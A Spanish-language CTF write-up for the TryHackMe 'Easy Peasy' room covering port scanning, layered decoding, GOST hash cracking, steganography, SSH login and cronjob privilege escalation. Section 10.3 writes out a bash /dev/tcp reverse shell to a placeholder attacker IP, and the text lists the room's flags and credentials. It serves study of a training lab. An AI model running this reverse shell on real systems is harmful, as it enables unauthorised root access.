@@ -1,0 +1,383 @@
+---
+title: 'Easy Peasy'
+description: 'Enumeración web, decodificación en varias capas (Base64/Base62), cracking de un hash GOST, esteganografía y SSH en un puerto no estándar.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - cryptography
+  - privesc
+---
+
+**Dificultad:** Easy/Medium **Categoría:** Enumeración web, decodificación (Base64/Base62), cracking de hash GOST, esteganografía (binario oculto), SSH en puerto no estándar, ROT13, escalada de privilegios vía cronjob **Sala:** [https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)
+
+## Descripción de la sala
+
+Máquina Linux que combina múltiples capas de ofuscación y codificación (Base64, Base62, binario, ROT13/rot13-like) con un hash «exótico» (GOST, un estándar criptográfico de origen soviético/ruso), esteganografía, y una escalada de privilegios clásica mediante un **cronjob root editable**. El nombre de la sala («Easy Peasy») es irónico: aunque el escaneo inicial es trivial, encontrar y decodificar cada capa requiere paciencia y conocimiento de distintos esquemas de codificación.
+
+> **Nota sobre placeholders:** se usa `{IP}` para representar la IP asignada por TryHackMe (cambia en cada despliegue); estos apuntes usan `TARGET_IP` como ejemplo de una sesión concreta; sustitúyela por la IP actual de la instancia. `{ATTACKER_IP}` representa la IP de la máquina atacante (necesaria para la reverse shell del cronjob).
+
+---
+
+## 1. Preparación del entorno
+
+```bash
+mkdir -p easy_peasy/{scans,content,scripts,loot,exploits} && cd easy_peasy
+settarget {IP}
+```
+
+---
+
+## 2. Escaneo de puertos
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+nmap -sC -sV {IP} -p-
+extractPorts scans/initial-scan
+```
+
+- `-p- --open`: escanea todos los puertos TCP y solo muestra los abiertos.
+- `-T5 -v -n`: temporización agresiva, verboso, sin resolución DNS.
+- `-sC -sV -p-`: segundo escaneo (esta vez sobre todos los puertos también) con scripts por defecto y detección de versión — importante en esta máquina porque, como se verá, **SSH no corre en el puerto 22 estándar**, sino en uno mucho más alto (6498), y hay otro servicio HTTP en un puerto no estándar (65524).
+
+**Puertos esperados (aproximados):**
+
+| Puerto    | Servicio                            |
+| --------- | ----------------------------------- |
+| 80/tcp    | HTTP                                |
+| 6498/tcp  | SSH (puerto no estándar)            |
+| 65524/tcp | HTTP adicional (puerto no estándar) |
+
+---
+
+## 3. Flag 1 — Directorio oculto en la web principal
+
+Explorando el servidor web en el puerto 80 (fuzzing con `gobuster` o revisando manualmente el código fuente/`robots.txt`), se llega a una ruta oculta:
+
+```
+http://{IP}/hidden/whatever/
+```
+
+Dentro se encuentra una cadena en **Base64**:
+
+```bash
+echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
+```
+
+**Resultado:**
+
+<Flag value="flag{f1rs7_fl4g}" />
+
+---
+
+## 4. Flag 2 — Segundo servicio HTTP y `robots.txt`
+
+Se detecta un segundo servidor web en un puerto no estándar (`65524`), hallado en el escaneo completo de puertos:
+
+```bash
+wget http://{IP}:65524/robots.txt
+cat robots.txt
+```
+
+Dentro de `robots.txt` aparece un **hash MD5**:
+
+<Flag value="a18672860d0510e5ab6699730763b250" />
+
+Este hash corresponde directamente a la codificación MD5 de la segunda flag. Se puede confirmar/descifrar con una búsqueda en una base de datos de hashes conocidos (CrackStation) o simplemente reconociendo el patrón, ya que MD5 es reversible por consulta cuando el texto de entrada es simple:
+
+```bash
+echo -n 'flag{1m_s3c0nd_fl4g}' | md5sum
+```
+
+**Resultado:**
+
+<Flag value="flag{1m_s3c0nd_fl4g}" />
+
+---
+
+## 5. Flag 3 — Directamente en la raíz del segundo servicio
+
+```bash
+curl http://{IP}:65524/
+```
+
+Al revisar el código fuente de esta página (`Ctrl+U` o `curl` directo), aparece la tercera flag visible como texto plano dentro del HTML:
+
+<Flag value="flag{9fdafbd64c47471a8f54cd3fc64cd312}" />
+
+---
+
+## 6. Encontrar el directorio oculto vía Base62
+
+Siguiendo con la exploración del código fuente de `http://{IP}:65524/` (o de su `robots.txt`), se encuentra una cadena adicional de aspecto extraño, ni Base64 ni Base32 estándar:
+
+```
+ObsJmP173N2X6dOrAgEAL0Vu
+```
+
+Al intentar decodificarla con los esquemas de codificación habituales (Base64, Base32, Base16/hex) el resultado no tiene sentido. La pista de la sala indica que empieza por **«ba..»**, lo cual lleva a probar esquemas menos comunes hasta dar con **Base62** — un esquema de codificación que usa únicamente caracteres alfanuméricos (`0-9`, `A-Z`, `a-z`, sin símbolos especiales como `+`, `/` o `=`), motivo por el cual no se reconoce a simple vista como «codificación típica».
+
+Se puede decodificar con una herramienta online (por ejemplo, [CyberChef](https://gchq.github.io/CyberChef/) con la receta «From Base62») o con una librería de Python:
+
+```bash
+python3 -c "
+import base62
+print(base62.decodebytes('ObsJmP173N2X6dOrAgEAL0Vu'))
+"
+```
+
+**Resultado (una ruta de directorio):**
+
+```
+/n0th1ng3ls3m4tt3r
+```
+
+---
+
+## 7. Explorando el directorio oculto
+
+```bash
+curl http://{IP}:65524/n0th1ng3ls3m4tt3r/
+```
+
+Esta página muestra una imagen (`binarycodepixabay.jpg`, con temática de «código binario» en el fondo — una pista visual bastante directa) y, en el código fuente/cuerpo de la página, un hash adicional:
+
+```
+940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+```
+
+### 7.1 Identificación del tipo de hash
+
+Este hash tiene 64 caracteres hexadecimales, lo cual sugiere en principio SHA-256, pero varias herramientas de identificación (`hash-identifier`, `hashid`) devuelven varias opciones candidatas ambiguas (SHA-256, Haval-256, GOST, etc.) debido a que comparten la misma longitud. La propia sala da la pista explícita de que es un hash **GOST** (un estándar de hash criptográfico de 256 bits desarrollado originalmente en la Unión Soviética, parte del estándar GOST R 34.11-94).
+
+### 7.2 Cracking del hash GOST
+
+Se guarda el hash y se lanza John the Ripper especificando el formato correcto:
+
+```bash
+nano hash.txt
+# Pegar: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+
+nano easypeasy.txt
+# Pegar la wordlist personalizada proporcionada por la sala (descargable desde la propia tarea de TryHackMe)
+
+john --wordlist=easypeasy.txt --format=gost hash.txt
+john --show --format=gost hash.txt
+```
+
+- `--format=gost`: le indica explícitamente a John qué algoritmo usar, ya que GOST no es un hash que John detecte automáticamente por su longitud (a diferencia de MD5/SHA estándar).
+- Alternativa equivalente con Hashcat: `hashcat -m 6900 hash.txt easypeasy.txt` (`-m 6900` es el modo GOST R 34.11-94 en Hashcat).
+
+**Contraseña obtenida: `mypasswordforthatjob`**
+
+> Esta contraseña se usará en el siguiente paso para abrir el archivo protegido con `steghide`.
+
+---
+
+## 8. Esteganografía — usuario y contraseña en binario
+
+Se descarga la imagen encontrada en el directorio oculto:
+
+```bash
+wget http://{IP}:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+```
+
+```bash
+steghide info binarycodepixabay.jpg
+steghide extract -sf binarycodepixabay.jpg
+# Passphrase: mypasswordforthatjob
+```
+
+Esto extrae un archivo de texto (`secrettext.txt`, según varias resoluciones públicas de la sala) cuyo contenido es una **cadena en binario**:
+
+```bash
+cat secrettext.txt
+```
+
+```
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+```
+
+### 8.1 Decodificación del binario
+
+Cada grupo de 8 bits (1 byte) representa un carácter ASCII. Se puede decodificar manualmente con Python:
+
+```bash
+python3 -c "
+binario = '01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001'
+texto = ''.join(chr(int(b, 2)) for b in binario.split())
+print(texto)
+"
+```
+
+**Resultado:**
+
+```
+iconvertedmypasswordtobinary
+```
+
+En esta máquina, este texto decodificado corresponde a la **contraseña**, mientras que el **nombre de usuario** (`boring`) se obtiene de otro elemento de la misma página (por ejemplo, del nombre del archivo de imagen restante en el directorio, o de una segunda cadena similar según la variante de la sala — en estos apuntes ya estaba identificado directamente).
+
+**Credenciales obtenidas:**
+
+```
+usuario: boring
+contraseña: iconvertedmypasswordtobinary
+```
+
+> **Atajo alternativo documentado por la comunidad:** en lugar de crackear el hash GOST manualmente para obtener la passphrase de `steghide`, se puede usar directamente **`stegseek`** (una versión ultrarrápida de «stegcracker») contra la imagen, usando la misma wordlist `easypeasy.txt`, sin necesidad de identificar el tipo de hash en absoluto: `stegseek binarycodepixabay.jpg easypeasy.txt`.
+
+---
+
+## 9. Acceso SSH (puerto no estándar)
+
+```bash
+ssh boring@{IP} -p 6498
+# contraseña: iconvertedmypasswordtobinary
+```
+
+- `-p 6498`: importante especificar el puerto, ya que SSH no está escuchando en el puerto 22 por defecto en esta máquina (confirmado en el escaneo inicial de puertos).
+
+### 9.1 Flag de usuario (codificada con un cifrado de sustitución tipo ROT13)
+
+```bash
+cat user.txt
+```
+
+```
+synt{a0jvgf33zfa0ez4y}
+```
+
+Esta cadena tiene la forma `synt{...}` en vez de `flag{...}` — un patrón clásico de **ROT13** (o una variante de desplazamiento similar), donde cada letra se sustituye por la que está 13 posiciones más adelante en el alfabeto. Se decodifica con `tr`:
+
+```bash
+echo "synt{a0jvgf33zfa0ez4y}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+- `tr 'A-Za-z' 'N-ZA-Mn-za-m'`: mapea cada letra mayúscula/minúscula a la que está 13 posiciones adelante (ciclando al llegar a la `Z`/`z`), que es exactamente la operación de ROT13. Al aplicar ROT13 dos veces sobre el mismo texto se recupera el original (ROT13 es su propia inversa), lo que confirma que `synt{...}` es simplemente `flag{...}` rotado.
+
+**Resultado (flag de usuario descifrada):** el texto claro correspondiente, con formato `flag{...}`.
+
+---
+
+## 10. Escalada de privilegios
+
+### 10.1 Enumeración de tareas programadas
+
+```bash
+cat /etc/crontab
+```
+
+Se encuentra una entrada que ejecuta periódicamente (por ejemplo, cada minuto) un script **como root**:
+
+```
+* * * * * root /var/www/.mysecretcronjob.sh
+```
+
+### 10.2 Verificar permisos del script
+
+```bash
+ls -la /var/www/.mysecretcronjob.sh
+```
+
+El archivo resulta ser **escribible** por el usuario `boring` (o por el grupo al que pertenece), pese a que su ejecución programada corre con privilegios de **root** — el mismo patrón de vulnerabilidad visto en la máquina Archangel.
+
+### 10.3 Explotación
+
+Primero, se levanta un listener en la máquina atacante:
+
+```bash
+nc -lvnp 4444
+```
+
+Se edita el script para inyectar una reverse shell:
+
+```bash
+nano /var/www/.mysecretcronjob.sh
+```
+
+Contenido a insertar:
+
+```bash
+bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1
+```
+
+- `bash -i`: shell interactiva.
+- `>& /dev/tcp/{ATTACKER_IP}/4444`: redirige salida estándar y errores hacia una conexión TCP contra la máquina atacante, puerto 4444.
+- `0>&1`: redirige también la entrada estándar por el mismo canal, permitiendo interacción bidireccional.
+
+En menos de 60 segundos (según la frecuencia del cron), el script se ejecuta con privilegios de root y el listener recibe la conexión:
+
+```bash
+id
+# uid=0(root) ...
+```
+
+### 10.4 Mejorar la interactividad de la shell
+
+Una vez obtenida la shell (limitada, como suele ocurrir con reverse shells básicas), conviene «mejorarla» a una shell completamente interactiva, con soporte de autocompletado, historial y control de señales (`Ctrl+C`, `Ctrl+L`, etc.):
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Después, en la terminal local (fuera de la shell remota):
+
+```
+Ctrl+Z
+stty raw -echo; fg
+```
+
+- `Ctrl+Z`: envía la shell remota a segundo plano temporalmente (en la terminal local).
+- `stty raw -echo`: configura la terminal local en modo «raw» (sin procesamiento de línea, sin eco local duplicado), necesario para que las teclas especiales funcionen correctamente en la sesión remota.
+- `fg`: retoma la shell remota en primer plano, ahora con el terminal ya configurado correctamente.
+
+Finalmente, dentro de la shell remota:
+
+```bash
+export TERM=xterm
+```
+
+- Define el tipo de terminal, habilitando el uso correcto de comandos que dependen de esa variable (como `clear`, editores de texto interactivos, colores, etc.).
+
+### 10.5 Flag de root
+
+```bash
+cat /root/.root.txt
+```
+
+<Flag value="flag{63a9f0ea7bb98050796b649e85481845}" />
+
+---
+
+## 11. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → HTTP (80), SSH en puerto no estándar (6498), HTTP adicional (65524).
+2. **Flag 1**: directorio oculto en el puerto 80 → cadena Base64 → decodificada.
+3. **Flag 2**: `robots.txt` en el puerto 65524 → hash MD5 correspondiente a la flag.
+4. **Flag 3**: visible directamente en el código fuente del servicio del puerto 65524.
+5. **Decodificación Base62** de una cadena adicional → revela el directorio oculto `/n0th1ng3ls3m4tt3r`.
+6. **Cracking de un hash GOST** (`--format=gost` en John, o `-m 6900` en Hashcat) con la wordlist provista por la sala → contraseña para `steghide`.
+7. **Esteganografía**: se extrae un mensaje en **binario** de una imagen → usuario `boring` y contraseña `iconvertedmypasswordtobinary`.
+8. **Acceso SSH** en el puerto no estándar `6498`.
+9. **Flag de usuario codificada en ROT13** (`synt{...}`) → decodificada con `tr`.
+10. **Escalada de privilegios**: cronjob root que ejecuta un script editable por el usuario sin privilegios → reverse shell como root.
+11. **Flag de root** final.
+
+## 12. Lecciones aprendidas / conceptos clave
+
+- **Cadenas de codificación en capas** (Base64 → Base62 → binario → ROT13) son un patrón común en máquinas educativas para forzar el reconocimiento de distintos esquemas de codificación, más que representar riesgos de seguridad «reales» en sí mismos.
+- **Base62** es un esquema poco común pero existente (usa solo `0-9A-Za-z`, sin caracteres especiales), lo que lo hace fácil de confundir con texto «aleatorio» en vez de reconocerlo como una codificación reversible.
+- **GOST R 34.11-94** es un ejemplo de que no todos los algoritmos de hash «exóticos» son automáticamente reconocidos por herramientas de identificación estándar; especificar el `--format` correcto en John (o el modo `-m` correcto en Hashcat) es indispensable.
+- **`stegseek`** es una alternativa mucho más rápida que crackear manualmente un hash y luego usar `steghide` por separado, cuando el objetivo final es simplemente encontrar la passphrase correcta de un archivo esteganografiado usando una wordlist conocida.
+- **Puertos no estándar para servicios como SSH** son una técnica de «seguridad por oscuridad» que retrasa (pero no impide) el reconocimiento; un escaneo completo de puertos (`-p-`) siempre debe hacerse antes de asumir que un servicio «no está disponible».
+- **Cronjobs root con scripts editables por usuarios sin privilegios** siguen siendo, junto con permisos `sudo` mal configurados y binarios SUID, uno de los tres vectores de escalada de privilegios más comunes en máquinas Linux de CTF (y, desafortunadamente, también en sistemas reales mal administrados).
+
+## 13. Herramientas utilizadas
+
+`nmap`, navegador/`curl` (inspección web), `base64`, CyberChef (Base62), `john the ripper` / `hashcat` (formato GOST), `steghide` (o `stegseek` como alternativa), Python (decodificación de binario), cliente `ssh`, `tr` (ROT13), `netcat`, `python3 -c 'import pty...'` (mejora de shell).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Easy Peasy» en TryHackMe, complementada con writeups públicas de la comunidad para completar la decodificación Base62, la identificación del algoritmo GOST y el contexto del cronjob de escalada de privilegios._
